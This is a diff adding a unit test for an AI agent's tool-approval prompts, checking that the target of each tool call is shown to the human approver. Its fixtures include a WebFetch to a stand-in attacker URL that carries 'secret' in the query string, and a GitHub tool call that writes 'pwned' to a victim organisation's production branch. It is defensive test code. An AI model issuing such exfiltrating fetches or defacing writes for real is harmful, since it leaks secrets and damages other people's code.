@@ -112,6 +112,28 @@ describe("approvals", () => {
     endRun(s, run.info.runId, "idle");
   });
 
+  it("names the target of generic tools and shows every field of other (MCP) tools", async () => {
+    const s = sid();
+    const run = beginRun(s, "turn", "pwa");
+    await createApproval(s, "WebFetch", { url: "https://evil.example/x?d=secret", prompt: "summarize" } as never);
+    await createApproval(s, "Read", { file_path: "/etc/hosts" });
+    await createApproval(s, "mcp__github__create_or_update_file", {
+      owner: "victim-org", repo: "prod", branch: "main", path: "README.md", content: "pwned",
+    } as never);
+    await createApproval(s, "mcp__fs__list", { path: "/srv" } as never);
+    const reqs = events(s).filter((e) => e.type === "approval_request");
+    expect(reqs[0]).toMatchObject({ tool: "WebFetch", command: "https://evil.example/x?d=secret" });
+    expect(reqs[0].filePath).toBeUndefined();
+    expect(reqs[1]).toMatchObject({ tool: "Read", filePath: "/etc/hosts" });
+    expect(reqs[1].command).toBeUndefined();
+    expect(reqs[2].filePath).toBe("README.md");
+    expect(JSON.parse(reqs[2].command!)).toEqual({ owner: "victim-org", repo: "prod", branch: "main", content: "pwned" });
+    expect(reqs[3]).toMatchObject({ filePath: "/srv" });
+    expect(reqs[3].command).toBeUndefined();
+    denyAllPending(s);
+    endRun(s, run.info.runId, "idle");
+  });
+
   it("validates the hook token in constant time", () => {
     expect(isValidHookToken(hookToken())).toBe(true);
     expect(isValidHookToken("nope")).toBe(false);
